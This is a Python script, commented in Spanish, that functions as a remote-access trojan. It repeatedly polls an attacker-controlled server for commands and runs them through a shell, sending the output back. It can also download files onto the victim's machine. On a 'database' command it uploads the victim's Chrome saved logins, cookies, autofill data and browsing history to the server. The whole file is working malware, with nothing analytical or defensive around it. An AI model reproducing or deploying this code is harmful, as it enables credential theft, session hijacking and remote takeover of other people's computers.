import requests
from requests.api import post
import os
import time
import getpass
import subprocess
print("INICIANDO")
user = getpass.getuser()


urlp = "pagina propia aqui"

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
ip = requests.post(f"{urlp}", headers=headers).text
#print(ip)
time.sleep(2)


while True:
    comand  = requests.post(f"{urlp}/comand.txt", headers=headers).text

    
    if comand == "":
        comand  = requests.post(f"{urlp}/dispo/{ip}.txt", headers=headers).text
        if comand == "":
            time.sleep(10)
            print("no hay comandos user")
        elif comand == "downloads":
            time.sleep(2)
            link = requests.post(f"{urlp}/download.txt", headers=headers).text
            name = requests.post(f"{urlp}/download1.txt", headers=headers).text
            myfile = requests.get(link)
            open(f"c:/users/{user}/chrome/{name}", 'wb').write(myfile.content)
            requests.post(f"{urlp}/index.php", data={"data": "lo", "userr": user}, headers=headers)
            
        elif comand == "upload":
            dirr = requests.post(f"{urlp}/download.txt", headers=headers).text
            url = f"{urlp}/dbs/upload.php"
            files = {"subir_archivo": open("name.txt", "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            requests.post(f"{urlp}/index.php", data={"data": "lo", "userr": user}, headers=headers)
            
        elif comand == "database":
            getuser = getpass.getuser()
            #copiando del sistema
            history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
            webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
            loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
            Visited = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Visited Links"
            Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"


            #mandando al server

            user = getpass.getuser()

            file = open("name.txt", "w")
            file.write("Nombre del pc: " + user)
            file.close()
            #url que se usara para recivir los archivos

            url = f"{urlp}/dbs/upload.php"
            #headers 
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}



            #subiendo el archivo
            files = {"subir_archivo": open("name.txt", "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text


            files = {"subir_archivo": open(loginData, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            
            """_____________________________________________________________________________________________________"""
            files = {"subir_archivo": open(webData, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(Cookies, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(Visited, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(history, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            requests.post(f"{urlp}/index.php", data={"data": "lo", "userr": user}, headers=headers)

        else:
            try:
                rep = subprocess.check_output(comand, shell=True)
                requests.post(f"{urlp}/index.php", data={"data": rep, "userr": user}, headers=headers)
                print(rep)          
                print("Enviando comandos user")
                time.sleep(10)
            except:
                pass
    else:
        if comand == "":
            time.sleep(10)
            print("no hay comandos principal")
        else:
            try:
                rep = subprocess.check_output(comand, shell=True)
                sub = requests.post(f"{urlp}/index.php", data={"data": rep, "admin": "listo"}, headers=headers)
                print(sub.text)          
                print("Enviando comandos principal")
                time.sleep(10)
            except:
                pass
